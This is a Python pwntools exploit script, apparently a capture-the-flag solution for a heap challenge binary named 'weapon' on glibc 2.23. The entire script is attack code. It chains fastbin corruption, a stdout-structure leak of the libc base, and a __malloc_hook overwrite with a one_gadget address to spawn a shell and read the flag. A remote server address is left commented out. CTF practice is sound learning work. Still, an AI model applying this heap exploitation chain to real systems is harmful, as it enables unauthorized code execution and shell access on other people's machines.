from pwn import *

context(os='linux',arch='amd64',log_level='debug')

p = process("./weapon");
#p=remote("139.180.216.34",8888)
libc=ELF("./libc-2.23.so")

def g(p,data=False):
	gdb.attach(p,data)
	raw_input()


def add(size,idx,data):
	p.recvuntil("choice >> \n")
	p.sendline(str(1))
	p.recvuntil("weapon: ")
	p.sendline(str(size))
	p.recvuntil("index: ")
	p.sendline(str(idx))
	p.recvuntil("name:\n")
	p.send(data)

def add2(size,idx,data):
	
	p.sendline(str(1))
	sleep(0.1)
	p.sendline(str(size))
	sleep(0.1)
	p.sendline(str(idx))
	sleep(0.1)
	p.send(data)


def delete(idx):
	p.recvuntil("choice >> \n")
	p.sendline(str(2))
	p.recvuntil("idx :")
	p.sendline(str(idx))

def edit(idx,data):
	p.recvuntil("choice >> \n")
	p.sendline(str(3))
	p.recvuntil("idx: ")
	p.sendline(str(idx))	
	p.recvuntil("content:\n")
	p.send(data)

def edit2(idx,data):
	p.sendline(str(3))
	sleep(0.1)
	p.sendline(str(idx))	
    sleep(0.1)
	p.send(data)


add(0x60,0,p64(0)+p64(0x71)+"\x00"*0x50)
add(0x60,1,"\x00"*0x60)
add(0x60,2,"\x00"*0x60)
add(0x60,3,"\x00"*0x60)

delete(0)
delete(1)
edit(1,"\x10")

add(0x60,4,"\x00"*0x60)
add(0x60,5,"\x00"*0x50+p64(0)+p64(0xe1))
#g(p)
delete(1)
#p.recv()
add(0x60,6,"\xdd\x25")
delete(0)
delete(2)
edit(2,"\x70")
add(0x60,7,"\x00"*0x60)
add(0x60,8,"\x00"*0x60)
add(0x60,9,"\x00"*11+p64(0)*4+p64(0x00007f51e3f406e0)+p64(0xfbad1800)+p64(0x00007f51e3f406e0)*3+"\x50")
p.sendline()

libc_base = u64(p.recv(6).ljust(8,'\x00'))
libc_base = libc_base -0x3c56a3
print hex(libc_base)
malloc_addr = libc_base + libc.symbols['__malloc_hook']
print "malloc_hook"+hex(malloc_addr)
one_gadget_addr = libc_base +0xf1147
#g(p)
p.sendline(str(2))
#p.recvuntil("idx :")
sleep(0.1)
p.sendline(str(0))
sleep(0.1)
p.sendline(str(2))
sleep(0.1)
p.sendline(str(2))
sleep(0.1)
#g(p)
#delete(0)
#delete(2)
edit2(2,p64(malloc_addr-35))
sleep(0.1)
add2(0x60,7,"\x00"*0x60)
add2(0x60,8,'\x00'*19+p64(one_gadget_addr))
sleep(0.1)
p.sendline(str(1))
sleep(0.1)
p.sendline(str(60))
sleep(0.1)
p.sendline(str(7))

p.sendline("pwd")
p.sendline("ls")
p.sendline("cat flag")
#g(p)
p.interactive()
